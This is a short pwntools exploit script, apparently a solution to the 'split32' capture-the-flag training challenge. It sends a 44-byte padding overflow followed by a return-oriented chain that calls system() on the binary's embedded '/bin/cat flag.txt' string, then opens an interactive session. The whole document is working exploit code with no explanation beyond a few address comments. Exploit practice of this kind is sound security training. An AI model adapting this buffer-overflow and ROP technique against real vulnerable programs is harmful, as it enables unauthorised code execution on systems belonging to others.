from pwn import *

context(arch='i386', os='linux')
binary_name = 'split32'
p =    process('./'+binary_name)
elf =  ELF(binary_name)

system  = elf.sym["system"] #system  = 0x08048430 
command = next(elf.search('/bin/cat flag.txt')) #command = 0x0804a030 
exit =    0x080484e8
rop = "A"*44 + p32(system) + p32(exit) + p32(command)
log.info("system %s"  % hex(system))
log.info("command %s" % hex(command))
p.recvuntil("> ")
p.send(rop)
p.interactive()